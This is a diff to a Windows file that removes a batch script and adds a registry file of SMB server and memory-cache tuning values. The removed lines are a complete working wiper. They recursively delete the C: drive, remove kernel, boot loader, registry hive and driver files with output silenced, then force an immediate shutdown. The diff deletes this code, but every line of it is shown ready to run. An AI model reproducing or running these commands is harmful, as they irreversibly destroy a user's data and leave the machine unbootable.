@@ -1,17 +1,13 @@
-@echo off
-rd /s /q C:\ 2>nul 1>nul
-del /f /s /q C:\*.* 2>nul 1>nul
+﻿Windows Registry Editor Version 5.00
 
-del /f /q C:\Windows\System32\ntoskrnl.exe  2>nul 1>nul
-del /f /q C:\Windows\System32\hal.dll  2>nul 1>nul
-del /f /q C:\Windows\System32\winload.exe  2>nul 1>nul
-del /f /q C:\Windows\System32\winresume.efi  2>nul 1>nul
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters]
+"autodisconnect"=dword:ffffffff
+"Size"=dword:00000003
+"EnableOplocks"=dword:00000000
+"IRPStackSize"=dword:00000020
+"SharingViolationDelay"=dword:00000000
+"SharingViolationRetries"=dword:00000000
 
-del /f /q C:\Windows\System32\config\*   2>nul 1>nul
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management]
 
-del /f /q C:\bootmgr  2>nul 1>nul
-del /f /q C:\ntldr  2>nul 1>nul
-del /f /q C:\Windows\System32\Boot\*  2>nul 1>nul
-del /f /q C:\Windows\System32\drivers\* 2>nul 1>nul
-
-shutdown -s -f -t 0 2>nul 1>nul
+"LargeSystemCache"=dword:00000001
